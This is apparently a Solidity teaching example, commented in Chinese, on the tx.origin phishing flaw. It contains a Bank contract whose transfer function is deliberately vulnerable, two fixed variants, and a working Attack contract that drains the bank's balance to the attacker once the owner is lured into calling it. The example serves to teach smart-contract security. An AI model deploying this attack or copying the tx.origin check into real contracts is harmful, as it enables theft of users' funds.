// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

contract Bank {
    address public owner;//记录合约的拥有者

    //在创建合约时给 owner 变量赋值
    constructor() payable {
        owner = msg.sender;
    }

    function transfer(address payable _to, uint _amount) public {
        // 检查消息来源 ！！！ 可能owner会被诱导调用该函数，有钓鱼风险！
        // 前面使用tx.origin来检测调用者是合约还是EOA
        require(tx.origin == owner, "Not owner");
        //转账ETH
        (bool sent, ) = _to.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }

    // 使用msg.sender代替tx.origin
    function transfer1(address payable _to, uint256 _amount) public {
        require(msg.sender == owner, "Not owner");
        (bool sent, ) = _to.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }

    // 检验tx.origin == msg.sender
    // 这样也可以避免整个调用过程中混入外部攻击合约对当前合约的调用。但是副作用是其他合约将不能调用这个函数
    function transfer2(address payable _to, uint _amount) public {
        require(tx.origin == owner, "Not owner");
        require(tx.origin == msg.sender, "can't call by external contract");
        (bool sent, ) = _to.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }
}

// 漏洞的关键是要诱导bank的owner调用attack合约
contract Attack {
    // 受益者地址
    address payable public hacker;
    // Bank合约地址
    Bank bank;

    constructor(Bank _bank) {
        // 强制将address类型的_bank转换为Bank类型
        bank = Bank(_bank);
        // 将受益者地址赋值为部署者地址
        hacker = payable(msg.sender);
    }

    function attack() public {
        //诱导bank合约的owner调用，于是bank合约内的余额就全部转移到黑客地址中
        bank.transfer(hacker, address(bank).balance);
    }
}